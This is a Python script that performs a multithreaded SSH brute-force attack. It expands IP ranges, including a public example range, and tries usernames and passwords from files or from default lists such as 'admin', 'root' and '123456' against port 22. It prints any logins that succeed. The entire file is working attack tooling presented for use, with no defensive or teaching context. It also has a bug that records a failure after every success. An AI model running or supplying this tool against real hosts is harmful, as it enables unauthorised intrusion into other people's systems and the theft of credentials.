import paramiko
import threading
import queue
import time
import ipaddress
import random
from netaddr import IPNetwork

# Global configuration
rate_limit_delay = 1  # Seconds between attempts per thread
max_threads = 5  # Number of concurrent threads per IP
port = 22  # SSH default port

def generate_ip_list(ip_ranges):
    """Generate a list of IPs from the provided IP ranges."""
    ip_list = []
    for ip_range in ip_ranges:
        try:
            ip_list.extend([str(ip) for ip in IPNetwork(ip_range)])
        except Exception as e:
            print(f"[!] Error parsing IP range {ip_range}: {e}")
    random.shuffle(ip_list)  # Shuffle to randomize scanning
    return ip_list

def load_credentials(file_path, default_list):
    """Load credentials from a file or return the default list."""
    try:
        with open(file_path, 'r') as f:
            return [line.strip() for line in f.readlines() if line.strip()]
    except FileNotFoundError:
        print(f"[-] File {file_path} not found. Using default list.")
        return default_list

def attempt_ssh_login(host, port, username, password, result_queue):
    """Attempt to login to SSH with given credentials."""
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(host, port, username, password, timeout=5)
        print(f"[+] Login successful: {username}@{host}:{port} with password '{password}'")
        result_queue.put((host, username, password, True))
    except paramiko.AuthenticationException:
        print(f"[-] Login failed for {username}@{host}:{port} with password '{password}'")
    except Exception as e:
        print(f"[!] Error on {host}: {e}")
    finally:
        client.close()
    result_queue.put((host, username, password, False))

def worker(host, credentials_queue, result_queue):
    """Worker thread for processing login attempts."""
    while not credentials_queue.empty():
        username, password = credentials_queue.get()
        attempt_ssh_login(host, port, username, password, result_queue)
        time.sleep(rate_limit_delay)

def main():
    # IP ranges to scan (edit these ranges)
    ip_ranges = [
        "192.168.1.0/24",  # Example: Local subnet
        "203.0.113.0/24",  # Example: Public range
        # Add more ranges here
    ]

    # File paths for username and password lists
    usernames_file = "usernames.txt"
    passwords_file = "passwords.txt"

    # Default credentials
    default_usernames = ["admin", "root", "user", "guest", "test"]
    default_passwords = ["123456", "password", "admin", "root", "letmein"]

    # Load credentials
    usernames = load_credentials(usernames_file, default_usernames)
    passwords = load_credentials(passwords_file, default_passwords)

    # Generate IP list
    target_ips = generate_ip_list(ip_ranges)
    print(f"[+] Total IPs to scan: {len(target_ips)}")

    # Process each IP
    for host in target_ips:
        print(f"[*] Starting brute-force SSH attack on {host}:{port}")
        
        # Build a queue of credentials
        credentials_queue = queue.Queue()
        for username in usernames:
            for password in passwords:
                credentials_queue.put((username, password))

        # Result queue for storing outcomes
        result_queue = queue.Queue()

        # Create worker threads
        threads = []
        for _ in range(min(max_threads, credentials_queue.qsize())):
            thread = threading.Thread(target=worker, args=(host, credentials_queue, result_queue))
            thread.start()
            threads.append(thread)

        # Wait for all threads to complete
        for thread in threads:
            thread.join()

        # Process results
        print(f"[*] Results for {host}:")
        while not result_queue.empty():
            ip, username, password, success = result_queue.get()
            if success:
                print(f"    [+] Successful login: {username}:{password} on {ip}")
            else:
                print(f"    [-] Failed attempt: {username}:{password} on {ip}")

if __name__ == "__main__":
    main()
